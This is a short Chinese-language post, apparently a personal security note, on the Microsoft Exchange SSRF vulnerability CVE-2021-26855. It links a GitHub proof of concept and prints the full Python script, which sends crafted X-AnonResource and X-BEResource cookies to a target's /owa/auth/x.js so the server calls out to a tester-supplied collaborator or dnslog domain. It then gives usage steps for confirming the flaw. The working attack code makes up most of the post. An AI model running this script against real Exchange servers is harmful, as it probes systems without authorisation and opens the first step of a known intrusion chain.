<attachment contenteditable="false" data-atts="%5B%5D" data-aid=".atts-5c927c4d-5c15-4a6a-bb22-9b23384dbab0"></attachment><p>微软exchange 漏洞</p><p>Poc链接<a href="https://github.com/pussycat0x/CVE-2021-26855-SSRF" target="_blank">https://github.com/pussycat0x/CVE-2021-26855-SSRF</a></p><p>使用方法：-H 指定目标， -B 指定dnslog域名</p><p>代码：</p><pre class="ql-syntax" spellcheck="false">from argparse import ArgumentParser
import requests,sys

parser= ArgumentParser(description="CVE-2021-26855 SSRF POC", epilog='CVE-2021-26855.py -H targetdomai.com -b burpcollab.net')
rparser = parser.add_argument_group('required argument')
rparser.add_argument('-H', '--host',type=str, help='target domain',required=True)
rparser.add_argument('-B', '--burpcollab', type=str, help='Collabrator Client', required=True )
args= parser.parse_args()
def main():
  print(args.host)
  print(args.burpcollab)
  baseurl = 'https://'+ args.host+'/owa/auth/x.js'
  rheaders= {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'
  }

  cookie= {'X-AnonResource':'true',
  'X-AnonResource-Backend': args.burpcollab +'/ecp/default.flt?~3',
  'X-BEResource':'localhost/owa/auth/logon.aspx?~3'
  } 

  rget = requests.get(baseurl, headers=rheaders, cookies=cookie ,verify=False)
  print(rget)

main()

</pre><p>使用poc对漏洞验证</p><p>从dnslog 获取一个新的域名，-B 指定域名，回车后，dnslog受到解析记录</p><p><br></p>